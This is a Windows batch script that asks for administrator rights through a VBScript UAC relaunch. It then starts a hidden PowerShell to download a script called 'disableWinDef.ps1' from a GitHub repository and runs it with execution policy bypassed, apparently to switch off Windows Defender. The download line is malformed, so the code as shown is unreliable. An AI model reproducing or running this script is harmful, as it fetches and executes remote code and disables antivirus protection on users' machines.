@echo off
:: BatchGotAdmin

IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

if errorlevel 1 (
    echo Requesting administrative privileges...
    goto UACPrompt
) else (
    goto gotAdmin
)

:UACPrompt
echo Set UAC=CreateObject("Shell.Application") > "%temp%\getadmin.vbs"
set params=%*
echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
"%temp%\getadmin.vbs"
del "%temp%\getadmin.vbs"
exit /B

:gotAdmin
cd /d "%~dp0"

powershell powershell.exe -windowstyle hidden "https://github.com/Reiya-cyber/ResearchProject/blob/main/Original/Resources/disableWinDef.ps1' -OutFile 'disableWinDef.ps1"
powershell -NoProfile -ExecutionPolicy Bypass -File "disableWinDef.ps1"
